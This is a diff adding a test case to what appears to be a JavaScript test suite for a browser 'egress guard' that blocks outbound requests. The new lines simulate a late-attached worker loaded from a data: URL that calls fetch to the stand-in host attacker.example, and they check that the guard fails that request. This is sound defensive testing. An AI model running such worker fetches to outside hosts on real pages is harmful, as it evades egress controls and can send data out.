@@ -724,6 +724,12 @@ test("egress guard, clock-free: a worker the script made is closed when the call
   k.push(1, "Fetch.requestPaused", { requestId: "late2", resourceType: "Fetch", request: { url: "https://attacker.example/d", method: "GET", headers: {} } }, "S-LATE");
   await new Promise(r => setTimeout(r, 50));
   assert.ok(k.calls("Fetch.failRequest").some(c => c.params.requestId === "late2"), "the late-attached worker is judged");
+  // a worker from a data: URL that attaches late is judged the same way
+  k.push(1, "Target.attachedToTarget", { sessionId: "S-DATA", waitingForDebugger: true, targetInfo: { targetId: "DW", type: "worker", url: "data:text/javascript,fetch('https://attacker.example/e')" } });
+  await new Promise(r => setTimeout(r, 30));
+  k.push(1, "Fetch.requestPaused", { requestId: "late3", resourceType: "Fetch", request: { url: "https://attacker.example/e", method: "GET", headers: {} } }, "S-DATA");
+  await new Promise(r => setTimeout(r, 50));
+  assert.ok(k.calls("Fetch.failRequest").some(c => c.params.requestId === "late3"), "the late-attached data: URL worker is judged");
   // the page navigates: the sticky guard ends and Fetch goes off
   await navigateAway(k, 1);
   assert.ok(k.calls("Fetch.disable").length >= 1);
